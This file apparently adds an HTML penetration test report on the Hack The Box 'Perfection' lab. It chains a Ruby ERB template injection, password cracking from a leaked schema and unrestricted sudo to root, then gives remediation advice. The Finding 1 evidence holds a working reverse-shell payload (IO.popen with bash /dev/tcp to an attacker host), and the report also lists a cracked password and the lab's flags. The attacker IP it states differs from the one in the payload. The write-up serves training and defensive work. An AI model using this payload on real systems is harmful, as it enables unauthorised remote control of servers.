@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Perfection</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Perfection</h2>
+        <h3 class="report-meta">Date: February 26, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report outlines the findings from a penetration test conducted on the HTB Perfection machine (10.10.11.253). The assessment revealed a chain of high-risk vulnerabilities that allowed an unauthenticated attacker to gain full system control. The attack began with a Server-Side Template Injection (SSTI) vulnerability in the public-facing Ruby on Rails application, which was exploited for Remote Code Execution (RCE). Post-exploitation, a database of user password hashes was discovered. An email containing the password generation schema was also found, which enabled the cracking of a user's password. This user was found to have unrestricted `sudo` privileges, which were leveraged to escalate to the root user, completing the system compromise.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>3 high-risk vulnerabilities</strong> chained for full system access.</li>
+            <li><strong>Complete system compromise</strong> from unauthenticated to root.</li>
+            <li><strong>Server-Side Template Injection (SSTI)</strong> in a Ruby ERB application leading to RCE.</li>
+            <li><strong>Information Disclosure</strong> of password schema and insecure credential storage.</li>
+            <li><strong>Excessive Sudo Privileges</strong> allowing for a direct path to root.</li>
+        </ul>
+
+        <h3>Risk Level: HIGH</h3>
+        <p>The system is exposed to a high risk of compromise. The public-facing template injection vulnerability, combined with internal information disclosure and an overly permissive sudo configuration, provides a clear and effective path for an attacker to gain full administrative control.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.253</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.7</li>
+            <li><strong>Operating System:</strong> Ubuntu</li>
+            <li><strong>Web Framework:</strong> Ruby on Rails (Sinatra/WEBrick)</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> A Server-Side Template Injection (SSTI) vulnerability was identified in the Ruby ERB-based web application. A crafted payload was sent to the server, which executed an embedded Ruby command (`IO.popen`) to establish a reverse shell as the user `susan`.</li>
+            <li><strong>Privilege Escalation:</strong> As the user `susan`, a SQLite database containing user password hashes was discovered. An email found in the user's mail spool revealed the exact password generation algorithm. This information was used with `hashcat` to crack the password for the `susan` user. This password was then used with `sudo -l` to discover that `susan` had unrestricted root privileges (`ALL:ALL`), which was used to escalate to a root shell via `sudo su`.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Server-Side Template Injection in Ruby ERB</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 8.8<br>
+        <strong>CWE:</strong> CWE-94 (Improper Control of Generation of Code - 'Code Injection')</p>
+        <p><strong>Description:</strong><br>
+        The web application running on port 80 processes user input through a Ruby ERB template engine without proper sanitization. This allows an attacker to inject Ruby code within ERB tags (`<%= ... %>`), which is then executed on the server. This vulnerability was leveraged to execute OS commands via Ruby's `IO.popen` method, resulting in a reverse shell.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Technology:</strong> Ruby ERB templating.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was URL-encoded and sent to the application to trigger a reverse shell:</p>
+        <pre><code><%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %></code></pre>
+        <p><strong>Impact:</strong> This vulnerability allows an unauthenticated, remote attacker to execute arbitrary commands on the server with the privileges of the web application user (`susan`), providing the initial foothold.</p>
+
+        <h3>Finding 2: Information Disclosure of Password Schema</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)</p>
+        <p><strong>Description:</strong><br>
+        After gaining initial access, two key pieces of information were discovered: a SQLite database (`pupilpath_credentials.db`) containing SHA2-256 password hashes, and an email in `/var/mail/susan`. The email explicitly detailed the password creation format: `{firstname}_{firstname backwards}_{random integer}`. This disclosure of the password structure dramatically reduced the complexity of cracking the hashes, making a targeted brute-force attack feasible.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Location of Hashes:</strong> `~/Migration/pupilpath_credentials.db`</li>
+            <li><strong>Location of Schema:</strong> `/var/mail/susan`</li>
+            <li><strong>Cracked Credentials:</strong> `susan`:`susan_nasus_413759210`</li>
+        </ul>
+        <p><strong>Impact:</strong> The combination of the leaked schema and accessible hashes allowed the attacker to recover the user's system password, which was the key to leveraging the misconfigured sudo privileges.</p>
+
+        <h3>Finding 3: Excessive Sudo Privileges</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 8.8<br>
+        <strong>CWE:</strong> CWE-269 (Improper Privilege Management)</p>
+        <p><strong>Description:</strong><br>
+        The system user `susan` was configured in the `/etc/sudoers` file with unrestricted privileges. The entry `(ALL : ALL) ALL` allows the user to run any command as any user (including root) without restriction. After obtaining the user's password (Finding 2), this permission was trivially abused to gain a full root shell.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Configuration:</strong> `susan ALL=(ALL:ALL) ALL` in sudoers file.</li>
+            <li><strong>Exploitation Command:</strong> `sudo su`</li>
+        </ul>
+        <p><strong>Impact:</strong> This misconfiguration provided a direct and intended path for the `susan` user to gain full administrative control over the system, turning the user-level compromise into a complete system takeover.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Scanning:</strong> Identified SSH on port 22 and an HTTP service (Ruby/WEBrick) on port 80.</li>
+            <li><strong>Application Analysis:</strong> Determined the web application uses ERB templating and is likely vulnerable to SSTI.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>SSTI Exploitation:</strong> Crafted a Ruby ERB payload to execute a reverse shell.</li>
+            <li><strong>Foothold Gained:</strong> Received a shell on the attacking machine as the user `susan`.</li>
+        </ul>
+        
+        <h3>Phase 3: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Found a SQLite database with user hashes and an email detailing the password format.</li>
+            <li><strong>Credential Cracking:</strong> Used `hashcat` with a targeted mask based on the disclosed schema to crack `susan`'s password.</li>
+            <li><strong>Sudo Abuse:</strong> Used the cracked password to run `sudo -l`, discovered the `(ALL:ALL) ALL` privilege, and executed `sudo su`.</li>
+            <li><strong>Root Access:</strong> Gained a root shell and retrieved the root flag.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp open  http    nginx (reverse proxying to WEBrick 1.7.0)</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Fix Server-Side Template Injection:</strong> All user-controllable input that is passed to the ERB template engine must be strictly sanitized. Avoid rendering raw user input and use safe methods to display data.</li>
+            <li><strong>Remove Excessive Sudo Privileges:</strong> The sudo rule for the user `susan` (`ALL:ALL`) must be removed immediately. Follow the principle of least privilege, granting users sudo access only for the specific commands they need to perform their duties.</li>
+            <li><strong>Enforce Secure Password Policies:</strong> Do not disclose password generation schemas. Enforce the use of strong, unpredictable passwords that are not based on guessable patterns. Invalidate all current user passwords.</li>
+        </ol>
+
+        <h3>MEDIUM PRIORITY</h3>
+        <ol>
+            <li><strong>Secure Database Files:</strong> Restrict file permissions on sensitive files like the `pupilpath_credentials.db` database so they are not readable by the web application user.</li>
+            <li><strong>Security Awareness:</strong> Train developers and system administrators on the risks of template injection, the importance of secure password policies, and the dangers of overly permissive sudo rules.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/susan/user.txt</li>
+            <li><strong>Value:</strong> fdd4593895c33a598ed35941e94e6132</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> 572553cc52e27ccce2d964f31b5dce43</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>SSTI Payload:</strong> `<%= IO.popen(...) %>`</li>
+            <li><strong>Disclosed Password Schema:</strong> `{firstname}_{firstname backwards}_{random integer}`</li>
+            <li><strong>Cracked Password:</strong> `susan_nasus_413759210`</li>
+            <li><strong>Sudo Misconfiguration:</strong> `(ALL : ALL) ALL`</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The Perfection machine was compromised due to a series of high-risk vulnerabilities that created a clear path from external unauthenticated access to full root control. The initial entry point was a severe Server-Side Template Injection flaw in the web application, a common but critical vulnerability in modern web frameworks. The subsequent privilege escalation was made possible by a combination of poor operational security (disclosing a password schema in email) and a critical system misconfiguration (excessive sudo privileges). This engagement highlights the importance of secure coding practices for web applications, strong credential management, and strict adherence to the principle of least privilege in system administration.</p>
+        
+        <p><strong>Business Risk:</strong> HIGH - A public-facing web vulnerability allows an attacker to gain a foothold on the system, which can then be escalated to full administrative control. This could lead to a complete loss of data confidentiality and integrity, service disruption, and reputational damage.</p>
+        <p><strong>Technical Risk:</strong> The combination of a web-based RCE, information disclosure, and a direct privilege escalation path creates a highly reliable and severe risk to the system.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> February 26, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
